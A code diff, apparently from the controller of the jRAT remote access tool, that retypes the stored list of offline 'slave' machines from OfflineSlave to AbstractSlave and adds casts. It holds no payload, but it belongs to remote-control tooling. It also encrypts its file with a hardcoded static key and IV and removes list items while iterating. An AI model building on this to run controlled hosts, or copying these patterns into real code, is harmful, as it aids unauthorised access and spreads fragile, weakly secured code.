@@ -2,6 +2,7 @@ package io.jrat.controller.settings;
 
 import io.jrat.common.crypto.CryptoUtils;
 import io.jrat.common.crypto.KeyUtils;
+import io.jrat.controller.AbstractSlave;
 import io.jrat.controller.Globals;
 import io.jrat.controller.Main;
 import io.jrat.controller.OfflineSlave;
@@ -22,7 +23,7 @@ import javax.crypto.CipherOutputStream;
 
 public class StoreOfflineSlaves extends AbstractStorable {
 	
-	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
+	private static final List<AbstractSlave> LIST = new ArrayList<AbstractSlave>();
 	private static final StoreOfflineSlaves INSTANCE = new StoreOfflineSlaves();
 	private static final long TIME_TO_LIVE = 1000L * 60L * 60L * 24L * 7L; // 1 week
 	
@@ -30,7 +31,7 @@ public class StoreOfflineSlaves extends AbstractStorable {
 		return INSTANCE;
 	}
 
-	public List<OfflineSlave> getList() {
+	public List<AbstractSlave> getList() {
 		return LIST;
 	}
 	
@@ -39,8 +40,8 @@ public class StoreOfflineSlaves extends AbstractStorable {
 		CipherOutputStream cos = new CipherOutputStream(new FileOutputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, KeyUtils.STATIC_KEY, KeyUtils.STATIC_IV));
 		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cos));
 		
-		for (OfflineSlave os : LIST) {
-			writer.write(OfflineSlave.toString(os));
+		for (AbstractSlave os : LIST) {
+			writer.write(OfflineSlave.toString((OfflineSlave) os));
 			writer.newLine();
 		}
 		
@@ -78,7 +79,7 @@ public class StoreOfflineSlaves extends AbstractStorable {
 	}
 
 	public void add(OfflineSlave offlineSlave) {
-		for (OfflineSlave os : getList()) {
+		for (AbstractSlave os : getList()) {
 			if (os.equals(offlineSlave)) {
 				return;
 			}
@@ -88,8 +89,8 @@ public class StoreOfflineSlaves extends AbstractStorable {
 	}
 	
 	public void remove(OfflineSlave offlineSlave) {
-		for (OfflineSlave os : getList()) {
-			if(offlineSlave.getRandomId() == os.getRandomId()) {
+		for (AbstractSlave os : getList()) {
+			if(offlineSlave.getRandomId() == ((OfflineSlave) os).getRandomId()) {
 				getList().remove(os);
 			}
 		}
@@ -97,7 +98,7 @@ public class StoreOfflineSlaves extends AbstractStorable {
 
 	public void remove(int id) {
 		for (int i = 0; i < getList().size(); i++) {
-			if(getList().get(i).getRandomId() == id) {
+			if(((OfflineSlave) getList().get(i)).getRandomId() == id) {
 				getList().remove(i);
 			}
 		}
